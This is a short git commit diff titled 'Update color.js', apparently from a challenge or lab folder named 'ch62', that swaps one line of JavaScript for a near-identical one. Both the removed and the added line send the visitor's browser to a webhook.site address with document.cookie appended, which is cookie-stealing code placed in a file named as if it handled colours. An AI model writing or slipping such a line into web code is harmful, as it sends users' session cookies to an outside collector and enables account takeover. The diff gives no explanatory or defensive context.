fb67bf2a2b840cc71a535fa3d69f84a12aa58302
prado5409 <106552816+prado5409@users.noreply.github.com>
2026-07-30 12:07:57 +0100

    Update color.js

--- ch62/color.js
+++ ch62/color.js
@@ -1,1 +1,1 @@
-document.location="https://webhook.site/bbc1f1ee-2d9e-4a8e-a29e-8bb7885bb805?cookie="+encodeURIComponent(document.cookie);
+document.location="https://webhook.site/e2ce9a48-a35e-4fbd-ad61-981a6a24ed94?cookie="+encodeURIComponent(document.cookie);
